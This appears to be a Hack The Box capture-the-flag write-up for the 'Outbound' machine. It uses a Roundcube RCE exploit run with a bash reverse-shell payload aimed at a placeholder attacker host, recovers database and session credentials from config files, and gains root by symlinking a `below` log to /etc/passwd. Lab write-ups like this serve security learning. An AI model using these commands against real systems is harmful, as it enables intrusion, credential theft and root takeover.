# Thanatos HTB: Outbound – Writeup

**Machine IP**: `10.10.11.77`  
**Author**: Mridul Chamoli  
**Difficulty**: Easy  
**Category**: Linux | Web | Privilege Escalation  
**Date**: July 2025

---

## 🔍 1. Enumeration

### Nmap Scan
First, I performed an aggressive TCP scan across all ports with service detection and script scanning enabled:

```bash
nmap -p- -sTVC -Pn 10.10.11.77
```

**Open Ports Identified**:
- `22/tcp` – SSH (OpenSSH 9.6p1)
- `80/tcp` – HTTP (nginx 1.24.0)

The web server on port 80 redirected to a virtual host: `mail.outbound.htb`.

---

### /etc/hosts Configuration

I added the hostname to my `/etc/hosts`:

```bash
echo "10.10.11.77 mail.outbound.htb" | sudo tee -a /etc/hosts
```

---

### Nuclei Scan

I ran a vulnerability scan using Nuclei against the domain:

```bash
nuclei -u http://mail.outbound.htb -tags cves
```

This revealed a **critical vulnerability**:

> **CVE-2025-49113** – Roundcube Unauthenticated RCE (Deserialization)

---

### Fuzzing for Directories

I used `ffuf` to discover hidden directories:

```bash
ffuf -u http://mail.outbound.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

No useful results were found.

### robots.txt

Checked for disallowed paths:

```bash
curl http://mail.outbound.htb/robots.txt
```

Still no interesting paths were found.

---

## 🛠️ 2. Exploitation – CVE-2025-49113

I cloned and used the following exploit from Hakaioffsec:

> [CVE-2025-49113 Exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit)

### Exploitation Steps:

```bash
cd /home/thantos/Desktop/htb/outbound
git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit
cd CVE-2025-49113-exploit
python3 exploit.py -u http://mail.outbound.htb -e "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1"
```

This granted me an initial reverse shell. However, it was unstable.

### Stabilizing Shell

To improve interaction:

```bash
rlwrap nc -lvnp <port>
```

This provided a more stable shell environment.

---

## 🧬 3. Credential Extraction via Roundcube Config

Inside the Roundcube installation, I found database credentials in:

```
/var/www/html/config/config.inc.php
```

```php
$rcmail_config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

I logged into MySQL and accessed the `session` table:

```sql
SELECT * FROM session;
```

Found a Base64-encoded `auth_secret`.

---

## 🔐 4. Session Decryption and User Password Recovery

Using the DES key from the config:

```
rcmail-!24ByteDESkey*Str
```

I decrypted the session token using Triple-DES and derived plaintext credentials for other Roundcube users. These credentials were then used to SSH into:

```bash
ssh jacob@10.10.11.77
```

---

## ⬆️ 5. Privilege Escalation – CVE-2025-27591

As `jacob`, I enumerated sudo permissions:

```bash
sudo -l
```

```bash
(ALL) NOPASSWD: /usr/bin/below *
```

> **Note**: Some arguments were blacklisted, but the binary was still exploitable.

The `below` binary (system monitor) was vulnerable to:

> **CVE-2025-27591** – Arbitrary Write via Symlink

### Exploitation Steps:

1. Create a fake user entry:

```bash
echo 'root2::0:0:root:/root:/bin/bash' > /tmp/payload
```

2. Remove the log file and create a symlink to `/etc/passwd`:

```bash
rm /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
```

3. Trigger the `below` binary:

```bash
sudo /usr/bin/below
```

4. From the interface, paste the contents of `/tmp/payload` into the log (which now writes to `/etc/passwd`).

5. Switch to the new root user:

```bash
su root2
Password: 1
```

Got root shell access!

---

## 🧠 Key Takeaways

| Phase             | Technique                                          |
|------------------|----------------------------------------------------|
| Enumeration      | Nmap, Nuclei, ffuf, manual recon                   |
| Initial Foothold | Roundcube RCE via CVE-2025-49113                   |
| Credential Hunt  | config.inc.php → MySQL → Session → 3DES Decryption |
| Lateral Movement | SSH into `jacob` with recovered credentials        |
| PrivEsc          | CVE-2025-27591 (arbitrary file write) via `below` |

---

## 🎯 Final Access

```bash
whoami
root

hostname
outbound
```

---

### 📂 Directory Used
```
/home/thanatos/Desktop/htb/outbound
```

---

### ✅ Flags

- `user.txt` – Obtained as `jacob`
- `root.txt` – Obtained after exploiting `below`

---
